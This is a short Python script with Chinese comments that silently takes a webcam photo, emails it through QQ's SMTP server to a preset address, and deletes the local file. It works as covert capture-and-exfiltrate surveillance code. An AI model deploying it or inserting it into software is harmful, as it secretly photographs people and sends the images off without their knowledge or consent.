import os                                       # 删除图片文件
import cv2                                      # 调用摄像头拍摄照片
import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.image import MIMEImage

# 调用摄像头拍摄照片
def get_photo():
    cap = cv2.VideoCapture(0)           # 开启摄像头
    f, frame = cap.read()               # 将摄像头中的一帧图片数据保存
    cv2.imwrite('image.jpg', frame)     # 将图片保存为本地文件
    cap.release()                       # 关闭摄像头

# 把图片文件发送到我的邮箱
def send():
    sender = '发件人邮箱'
    receivers = '收件人邮箱'
    message =  MIMEMultipart('related')
    subject = '公众号：Python爬虫数据分析挖掘'
    message['Subject'] = subject
    message['From'] = sender
    message['To'] = receivers
    content = MIMEText('<html><body><img src="cid:imageid" alt="imageid"></body></html>','html','utf-8')
    message.attach(content)

    file=open("image.jpg", "rb")
    img_data = file.read()
    file.close()

    img = MIMEImage(img_data)
    img.add_header('Content-ID', 'imageid')
    message.attach(img)

    try:
        server=smtplib.SMTP_SSL("smtp.qq.com",465)
        server.login(sender,"发件人的邮箱授权码")
        server.sendmail(sender,receivers,message.as_string())
        server.quit()
        print ("邮件发送成功")
    except smtplib.SMTPException as e:
        print(e)


if __name__ == '__main__':
    get_photo()                 # 开启摄像头获取照片
    send()              # 发送照片
    os.remove('image.jpg')      # 删除本地照片



